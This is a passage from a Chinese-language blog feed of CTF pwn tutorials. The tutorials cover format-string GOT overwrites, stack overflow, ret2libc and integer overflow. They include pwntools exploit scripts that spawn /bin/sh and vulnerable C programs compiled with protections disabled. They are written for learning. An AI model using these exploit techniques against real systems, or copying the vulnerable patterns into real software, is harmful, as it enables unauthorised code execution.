class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>offset=12为什么是12，这是我手动的，当然pwntools提供了找偏移的个数的函数Fmtstr，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p</span></div><div class="line"><span class="string">Nice to meet you, AAAA0x80487d00xff8e5e2c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x702541410x70257025 :)</span></div><div class="line"><span class="string">root@kali:pwn3# ./pwn3 </span></div><div class="line"><span class="string">Hello, I'</span>m nao!</div><div class="line">Please tell me your name... AABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p</div><div class="line">Nice to meet you, AABBBB0x80487d00xfff70c5c(nil)(nil)(nil)(nil)0x6563694e0x206f74200x7465656d0x756f79200x4141202c0x424242420x70257025 :)</div><div class="line">root@kali:pwn3<span class="comment"># ./pwn3 </span></div><div class="line">Hello, I<span class="string">'m nao!</span></div><div class="line"><span class="string">Please tell me your name... AABBBB%12$p</span></div><div class="line"><span class="string">Nice to meet you, AABBBB0x42424242 :)</span></div><div class="line"><span class="string">root@kali:pwn3#</span></div></pre></td></tr></table></figure></p><p>FmtStr和fmtstr_payload函数参考:<br><a href="https://esebanana.github.io/2017/10/09/pwn6/#more" target="_blank" rel="external">https://esebanana.github.io/2017/10/09/pwn6/#more</a></p><h2 id="修改exp"><a href="#修改exp" class="headerlink" title="修改exp:"></a>修改exp:</h2><p>上面的那个exp本地运行成功，但如果连上网的话，由于fmtstr_payload函数是产生大量的数据写入，如要写入的地址时0x8040506,那么就会生成0x8040506的无用字符传过去，在本地也需要运行一会儿，在上网根本不行，这里得用字节写入，这里可以参考:<br><a href="https://esebanana.github.io/2017/09/19/pwn3/#more" target="_blank" rel="external">https://esebanana.github.io/2017/09/19/pwn3/#more</a><br>中的修改b,贴上修改后的exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">elf = ELF(<span class="string">'./pwn3'</span>)</div><div class="line">systemPlt = elf.plt[<span class="string">'system'</span>]</div><div class="line">strlenGot = elf.got[<span class="string">'strlen'</span>]</div><div class="line">mainSymbol = elf.symbols[<span class="string">'main'</span>]</div><div class="line">finiSymbol = elf.symbols[<span class="string">'__do_global_dtors_aux_fini_array_entry'</span>]</div><div class="line">log.info(<span class="string">"system:%x\nstrlen:%x\nmain:%x\nfini:%x\n"</span>%(systemPlt,strlenGot,mainSymbol,finiSymbol))</div><div class="line"></div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line">offset =12</div><div class="line"></div><div class="line">mainSymbol = 0x080485ed</div><div class="line">finiSymbol = 0x08049934</div><div class="line">systemPlt = 0x08048490</div><div class="line">strlenGot = 0x8049a54</div><div class="line"></div><div class="line">payload = <span class="string">'aa'</span>+p32(0x08049936)+p32(0x08049a56)+p32(0x08049a54)+p32(0x08049934)</div><div class="line"></div><div class="line">first = 0x804 - 0x1c - 0x8 <span class="comment">#print 0x804 bytes before 0x8049936 </span></div><div class="line">second = 0x8490 - 0x0804</div><div class="line">third = 0x85ed - 0x8490</div><div class="line">payload += <span class="string">'%'</span> + str(first) +  <span class="string">'x%12$hn'</span></div><div class="line">payload += <span class="string">'%13$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(second) + <span class="string">'x%14$hn'</span></div><div class="line">payload += <span class="string">'%'</span> + str(third) + <span class="string">'x%15$hn'</span></div><div class="line">payload += <span class="string">""</span></div><div class="line"></div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="built_in">print</span> p.recvuntil(<span class="string">'... '</span>)</div><div class="line">payload2 = <span class="string">'/bin/sh'</span></div><div class="line">p.sendline(payload2)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p><p>这个exp是两字节写入</p><h1 id="FmtStr函数的利用"><a href="#FmtStr函数的利用" class="headerlink" title="FmtStr函数的利用"></a>FmtStr函数的利用</h1><h2 id="FmtStr函数"><a href="#FmtStr函数" class="headerlink" title="FmtStr函数"></a>FmtStr函数</h2><p>FmtStr函数可以获取偏移参数的个数offset<br>例如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include&lt;stdio.h&gt;</span></div><div class="line">int main(int argc, char * argv[])</div><div class="line">&#123;</div><div class="line">    char a[1024];</div><div class="line">    <span class="keyword">while</span>(1) </div><div class="line">    &#123;</div><div class="line">        memset(a, <span class="string">'\0'</span>, 1024);</div><div class="line">        <span class="built_in">read</span>(0, a, 1024);</div><div class="line">        <span class="built_in">printf</span>(a);</div><div class="line">        fflush(stdout);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>FmtStr函数利用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">def exec_fmt(payload):</div><div class="line">    p = process(<span class="string">'./1'</span>)</div><div class="line">    p.sendline(payload)</div><div class="line">    <span class="built_in">return</span> p.recv()</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line"><span class="built_in">print</span> autofmt.offset</div></pre></td></tr></table></figure></p><p>结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:pwn3<span class="comment"># python 1.py </span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4859</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4861</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4863</div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./1'</span>: pid 4865</div><div class="line">[*] Found format string offset: 4</div><div class="line">4</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4865)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4863)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4861)</div><div class="line">[*] Stopped process <span class="string">'./1'</span> (pid 4859)</div></pre></td></tr></table></figure></p><h2 id="fmtstr-payload函数"><a href="#fmtstr-payload函数" class="headerlink" title="fmtstr_payload函数"></a>fmtstr_payload函数</h2><p>fmtstr_payload是pwntools提供的函数，用于自动生成格式化字符串。<br>fmtstr_payload有两个参数<br>第一个参数是int，用于表示取参数的偏移个数offset=7<br>第二个参数是字典，字典的意义是往key的地址，写入value的值<br><code>fmtstr_payload(7, {printf_got: system_add})</code><br>这个函数调用会往printf_got中写入system_add</p><h2 id="文学修养"><a href="#文学修养" class="headerlink" title="文学修养"></a>文学修养</h2><p>我本楚狂人,凤歌笑孔丘<br>奈何许!天下人何限?慊慊只为汝!</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;FmtStr格式化字符串利用&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>搬家啦</title>
    <link href="http://yoursite.com/2018/05/09/pwn0/"/>
    <id>http://yoursite.com/2018/05/09/pwn0/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:40:14.258Z</updated>
    
    <content type="html"><![CDATA[<p>以前一直在网站写学习经历，突然发现不如自己写blog，而且自己很方便，就搬过来啦。这里先记录一下我在0day看了的一篇——缓冲区溢出<br><a id="more"></a></p><h1 id="1、栈溢出"><a href="#1、栈溢出" class="headerlink" title="1、栈溢出"></a>1、栈溢出</h1><h2 id="1、缓冲区溢出"><a href="#1、缓冲区溢出" class="headerlink" title="1、缓冲区溢出"></a>1、缓冲区溢出</h2><p> 缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，可以利用它执行非授权指令，甚至可以取得系统特权，进而进行各种非法操作。这里利用C语言不判断数组越界做缓冲区溢出。</p><h2 id="2、源代码"><a href="#2、源代码" class="headerlink" title="2、源代码"></a>2、源代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include&lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include&lt;String.h&gt;</span></div><div class="line"><span class="comment"># define passwd "9234567"</span></div><div class="line"></div><div class="line">int func_A(char *password)</div><div class="line">&#123;</div><div class="line">int a;</div><div class="line">    a = strcmp(password,passwd);</div><div class="line"></div><div class="line"><span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line">int main (int argc,char **argv,char **envp)</div><div class="line">&#123;</div><div class="line">int flag = 0;</div><div class="line">char password[16];</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"password:"</span>);</div><div class="line">scanf(<span class="string">"%s"</span>,password);</div><div class="line">flag = func_A(password);</div><div class="line"><span class="keyword">if</span>(flag)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"error!!\n"</span>);</div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"sccess!!\n"</span>);</div><div class="line"><span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>这是一个简单验证密码的函数。我们先了解它的栈。</p><p>这里解释一下栈的机制：栈是以EBP为基址(栈底)，ESP为栈顶。从高地址使用栈，逐渐向低地址扩散。</p><p>下图为现在栈的情况：<br> <img src="http://ww1.sinaimg.cn/large/006rgqhqgy1fki1tgzzjdj30fe088t9d.jpg" alt=""></p><h2 id="3、缓冲区溢出代码"><a href="#3、缓冲区溢出代码" class="headerlink" title="3、缓冲区溢出代码"></a>3、缓冲区溢出代码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include&lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include&lt;String.h&gt;</span></div><div class="line"><span class="comment"># define passwd "1234567"</span></div><div class="line"></div><div class="line">int func_A(char *password)</div><div class="line">&#123;</div><div class="line">int a;</div><div class="line">char b[8];     //用于缓冲区溢出</div><div class="line">a = strcmp(password,passwd);</div><div class="line">strcpy(b,password);  //这里缓冲区溢出</div><div class="line"><span class="built_in">return</span> a;</div><div class="line">&#125;</div><div class="line">int main (int argc,char **argv,char **envp)</div><div class="line">&#123;</div><div class="line">int flag = 0;</div><div class="line">char password[16];</div><div class="line"><span class="keyword">while</span>(1)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"password:"</span>);</div><div class="line">scanf(<span class="string">"%s"</span>,password);</div><div class="line">flag = func_A(password);</div><div class="line"><span class="keyword">if</span>(flag)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"error!!\n"</span>);</div><div class="line">&#125;<span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"sccess!!\n"</span>);</div><div class="line"><span class="built_in">break</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p> 这里覆盖a的值，从而达到绕过验证。同样来看看代码的栈情况<br> 如何溢出的，我们来看看如下情况：<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fki1uhhrzvj30fe04fmxj.jpg" alt=""></p><p>这是因为C语言没有判断数组越界的情况，当传入func_A()函数的字节超过8字节时，就会产生溢出，覆盖高地址的值（包括返回地址，这里就可以做很多事的。。）。<br> 程序采用小端序，如果输入的值大于验证的值，a=1;而我们输入8字节，程序字符串都是以null结束的。这时null就会覆盖a的值，使其为null(0);<br> 输入:23456789 就会:sccess</p><p>如果输入的值小于验证的值，a=-1（0xFFFFFFFF）;而我们输入11字节(比如12345670000)，这时null就会覆盖a的值，使其为000;但是并没有成功<br>开始不理解，后来发现为什么啦，这里就留给读者思考吧。思考使我快乐…</p><p> 程序很简单，可以自己动手做做。主要理解栈溢出的原理，为以后打好基础。</p><h1 id="2、栈溢出——控制流劫持"><a href="#2、栈溢出——控制流劫持" class="headerlink" title="2、栈溢出——控制流劫持"></a>2、栈溢出——控制流劫持</h1><h2 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h2><p>通过覆盖返回地址，让程序执行我们想要执行的位置（任意地址）,包括我们构造的shellcode，从而得到shell<br>换个姿势理解： <a href="https://esebanana.github.io/2017/09/14/window-hexo/" target="_blank" rel="external">https://esebanana.github.io/2017/09/14/window-hexo/</a></p><h2 id="2、源码福利"><a href="#2、源码福利" class="headerlink" title="2、源码福利"></a>2、源码福利</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line">void <span class="function"><span class="title">success</span></span>() &#123;</div><div class="line">puts(<span class="string">"You Hava already controlled it."</span>);</div><div class="line">system(<span class="string">"/bin/sh"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void <span class="function"><span class="title">vulnerable</span></span>() &#123;</div><div class="line">char s[12];</div><div class="line">gets(s);</div><div class="line">puts(s);</div><div class="line"><span class="built_in">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line">vulnerable();</div><div class="line"><span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="3、命令编译程序生成stack1-exe文件"><a href="#3、命令编译程序生成stack1-exe文件" class="headerlink" title="3、命令编译程序生成stack1.exe文件"></a>3、命令编译程序生成stack1.exe文件</h2><p><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o stack1 stack1.c</code><br>-no-pie会关掉PIE,-fno-stack-protector和-z execstack这两个参数会分别关掉Stack Protector和NX</p><h2 id="4、分析"><a href="#4、分析" class="headerlink" title="4、分析"></a>4、分析</h2><p>使用ida打开，发现如下:<br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0dswpxmj30a4049q2q.jpg" alt=""><br><img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjp0gjcua3j30fe05xq41.jpg" alt=""></p><p>这里就可以覆盖返回地址构造溢出</p><h2 id="5、写exp"><a href="#5、写exp" class="headerlink" title="5、写exp"></a>5、写exp</h2><p>这里可以安装pwntools，这是一个很好用的工具<br><code>git clone https://github.com/Gallopsled/pwntools</code><br><code>cd pwntools</code><br><code>python setup.py install</code><br>调试可以用gdb,可以安装插件peda<br><code>git clone https://github.com/longld/peda.git ~/peda</code><br><code>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit</code></p><p>exp:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'A'</span>*24 + p32(0x804846B)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前一直在网站写学习经历，突然发现不如自己写blog，而且自己很方便，就搬过来啦。这里先记录一下我在0day看了的一篇——缓冲区溢出&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN——CTF中的简单ret2blic</title>
    <link href="http://yoursite.com/2018/05/09/pwn2/"/>
    <id>http://yoursite.com/2018/05/09/pwn2/</id>
    <published>2018-05-09T03:52:41.268Z</published>
    <updated>2018-05-02T02:40:22.717Z</updated>
    
    <content type="html"><![CDATA[<p>某平台上的一道题<br><a id="more"></a></p><h1 id="1、ret2blic"><a href="#1、ret2blic" class="headerlink" title="1、ret2blic"></a>1、ret2blic</h1><h2 id="1、何为ret2blic"><a href="#1、何为ret2blic" class="headerlink" title="1、何为ret2blic"></a>1、何为ret2blic</h2><p>通过返回地址或者函数的plt跳到我们需要执行的函数，从而达到我们想要的，一般都是得到shell</p><h2 id="2、源码"><a href="#2、源码" class="headerlink" title="2、源码"></a>2、源码</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line"><span class="comment">#include &lt;unistd.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line">char *shell = <span class="string">"/bin/sh"</span>;</div><div class="line">void <span class="function"><span class="title">grant</span></span>() &#123;</div><div class="line">   system(<span class="string">"Good job"</span>);</div><div class="line">&#125;</div><div class="line">void <span class="function"><span class="title">exploitable</span></span>() &#123;</div><div class="line">   char buffer[16];</div><div class="line">   scanf(<span class="string">"%s"</span>, buffer);</div><div class="line">   <span class="keyword">if</span>(strcmp(buffer,<span class="string">"pwned"</span>) == 0) grant();</div><div class="line">   <span class="keyword">else</span>  puts(<span class="string">"Nice try\n"</span>);</div><div class="line">&#125;</div><div class="line">int <span class="function"><span class="title">main</span></span>()&#123;</div><div class="line">   exploitable();</div><div class="line">   <span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>运行命令生成<br><code>gcc -m32 -no-pie -fno-stack-protector -z execstack -o pwn1 pwn1.c</code></p><h2 id="3、漏洞原理，利用ret2blic技术"><a href="#3、漏洞原理，利用ret2blic技术" class="headerlink" title="3、漏洞原理，利用ret2blic技术"></a>3、漏洞原理，利用ret2blic技术</h2><p>ida打开，查看grant函数 汇编代码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">.text:080484CB grant           proc near               ; CODE XREF: </div><div class="line">.text:080484CB</div><div class="line">.text:080484CB var_4           = dword ptr -4</div><div class="line">.text:080484CB</div><div class="line">.text:080484CB                 push    ebp</div><div class="line">.text:080484CC                 mov     ebp, esp</div><div class="line">.text:080484CE                 push    ebx</div><div class="line">.text:080484CF                 sub     esp, 4</div><div class="line">.text:080484D2                 call    __x86_get_pc_thunk_ax</div><div class="line">.text:080484D7                 add     eax, 1B29h</div><div class="line">.text:080484DC                 sub     esp, 0Ch</div><div class="line">.text:080484DF                 lea     edx, (aGoodJob - 804A000h)[eax] ; <span class="string">"Good job"</span></div><div class="line">.text:080484E5                 push    edx             ; <span class="built_in">command</span></div><div class="line">.text:080484E6                 mov     ebx, eax</div><div class="line">.text:080484E8                 call    _system</div><div class="line">.text:080484ED                 add     esp, 10h</div><div class="line">.text:080484F0                 nop</div><div class="line">.text:080484F1                 mov     ebx, [ebp+var_4]</div><div class="line">.text:080484F4                 leave</div><div class="line">.text:080484F5                 retn</div><div class="line">.text:080484F5 grant           endp</div></pre></td></tr></table></figure></p><p>这里可以理解为<br><code>system(command)</code><br>最后ret，将保存的 函数返回地址从堆栈的顶部pop出值到EIP。<br>而我们想要得到shell，就得将command改为“bin/sh”，即<br><code>system(&quot;bin/sh&quot;)</code></p><p>从ida我们看到“/bin/sh”的地址0x8048610<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">.rodata:08048610 aBinSh          db <span class="string">'/bin/sh'</span>,0          ; DATA XREF: .</div><div class="line">.rodata:08048618 aGoodJob        db <span class="string">'Good job'</span>,0         ; DATA XREF: </div><div class="line">.rodata:08048621 aS              db <span class="string">'%s'</span>,0               ; DATA XREF: </div><div class="line">.rodata:08048624 aPwned          db <span class="string">'pwned'</span>,0            ; DATA XREF: </div><div class="line">.rodata:0804862A aNiceTry        db <span class="string">'Nice try'</span>,0Ah,0     ; DATA XREF: </div><div class="line">.rodata:0804862A _rodata         ends</div></pre></td></tr></table></figure></p><p>从ida我们看到system_plt的地址0x8048390<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">.plt:08048390 ; int system(const char *<span class="built_in">command</span>)</div><div class="line">.plt:08048390 _system         proc near               ; CODE XREF: </div><div class="line">.plt:08048390                 jmp     ds:off_804A014</div><div class="line">.plt:08048390 _system         endp</div></pre></td></tr></table></figure></p><p>我们构造一个“假”的堆栈结构，然后修改函数的返回地址:</p><p><code>payload=&#39;a&#39;*28+p32(system_plt)+p32(1)+p32(sh_addr)</code></p><p>p32(system_plt):原函数的返回地址，这里改为我们要执行的system的地址<br>p32(1):system的返回地址，因为用不到，这里我随便填的。<br>p32(sh_addr):system的第一个参数，要执行字符串的地址，我们要拿到shell,就填’/bin/sh’的地址</p><h2 id="4、exp"><a href="#4、exp" class="headerlink" title="4、exp"></a>4、exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line"><span class="comment">#gdb.attach(p,'''break main''')</span></div><div class="line">system_plt=0x8048390</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>记录一下字节走的坑：<br>后面发现system_plt等等许多plt是不能用ida看到出来的,上面也许是巧合<br>要写会用system_plt=elf.symbols[‘system’]</p><h2 id="5、改善的exp"><a href="#5、改善的exp" class="headerlink" title="5、改善的exp"></a>5、改善的exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">p = process(<span class="string">'./pwn1'</span>)</div><div class="line">elf = ELF(<span class="string">'pwn1'</span>)</div><div class="line">system_plt=elf.symbols[<span class="string">'system'</span>]</div><div class="line">sh_addr=0x8048610</div><div class="line">payload=<span class="string">'a'</span>*28+p32(system_plt)+p32(1)+p32(sh_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h1 id="2、整数溢出"><a href="#2、整数溢出" class="headerlink" title="2、整数溢出"></a>2、整数溢出</h1><h2 id="1、整数溢出"><a href="#1、整数溢出" class="headerlink" title="1、整数溢出"></a>1、整数溢出</h2><p>整数溢出就是往存储整数的内存单位存放的数据大于该内存单位所能存储的最大值,整数溢出有时候间接导致缓冲区溢出。</p><h2 id="2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）"><a href="#2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）" class="headerlink" title="2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）"></a>2、题目-全球某工商的ctf网站上的ctf题（还有源码福利）</h2><p>题目：<br>链接：<a href="http://pan.baidu.com/s/1nuU9pO1" target="_blank" rel="external">http://pan.baidu.com/s/1nuU9pO1</a> 密码：e7ue<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include</span></div><div class="line"><span class="comment">#include</span></div><div class="line"><span class="comment">#include</span></div><div class="line">void flow(char* input)</div><div class="line">&#123;</div><div class="line">char passwd_buf[11];</div><div class="line">unsigned char passwd_len = strlen(input);</div><div class="line"><span class="keyword">if</span>(passwd_len&gt;=4&amp;&amp;passwd_len&lt;=8)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Valid Password\n"</span>);</div><div class="line">strcpy(passwd_buf,input);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"Invalid Password\n"</span>);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">char input[1024];</div><div class="line">gets(input);</div><div class="line">flow(input);</div><div class="line"><span class="built_in">return</span> 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="3、分析"><a href="#3、分析" class="headerlink" title="3、分析"></a>3、分析</h2><p>   先file pwn0,发现为32位,checksec pwn0并且没有开NX,用ida打开，如下<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnx80zkt7j30fq07aaa0.jpg" alt=""><br>   发现栈空间为14h,这里是无符号接受判断输入的字符个数，也就是当超过256,个字符又会循环。即257为1，根据题目<br>   判断输入字符4~8个，即261=5，构造261位，既可以绕过检测，又为我们提供了栈空间</p><p>   由于已经知道那个函数的栈空间14h,那么函数的返回地址即为18h,但是我们的shellcode是大于18h的，所以放在18h的后面，payload如下：<br>   <code>payload =&#39;a&#39;*24 + ret + shellcode</code></p><p>   现在我们找到ret的地址，即是shellcode的起始地址（shellcode可以自己生成），这我…一言难尽<br>   <img src="http://ww3.sinaimg.cn/large/006rgqhqgy1fjnyh9bq2aj30np07yq3j.jpg" alt=""><br>   调试，找到shellcode的起始地址<br>   <img 